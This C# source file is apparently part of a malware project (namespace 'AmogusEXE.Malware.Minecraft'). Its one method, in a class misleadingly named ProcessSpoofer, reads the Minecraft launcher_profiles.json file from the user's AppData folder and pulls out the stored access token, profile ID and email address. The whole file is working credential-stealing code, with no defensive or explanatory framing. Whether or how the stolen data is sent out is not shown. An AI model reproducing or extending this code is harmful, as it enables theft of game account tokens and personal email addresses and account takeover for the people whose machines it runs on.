using System;
using System.Collections.Generic;
using System.IO;
using AmogusEXE.Malware.Reader;
using Chilkat;

namespace AmogusEXE.Malware.Minecraft
{
    public static class ProcessSpoofer
    {
        public static SortedDictionary<string, string> GetMinecraft()
        {
            if (Directory.Exists(
                $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\.minecraft\\"))
            {
                Reader.Reader reader = new Reader.Reader(ReaderType.JSON,
                    $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\.minecraft\\launcher_profiles.json");
                dynamic json = reader.ReadData;
                dynamic[] jsons = json.authenticationDatabase;
                dynamic cur = jsons[0];
                string token = cur.accessToken;
                string profileID = cur.profiles[0];
                string mail = cur.username;
                SortedDictionary<string, string> dict = new SortedDictionary<string, string>();
                dict["token"] = token;
                dict["profileID"] = profileID;
                dict["email"] = mail;
                return dict;
            }
            return null;
        }
    }
}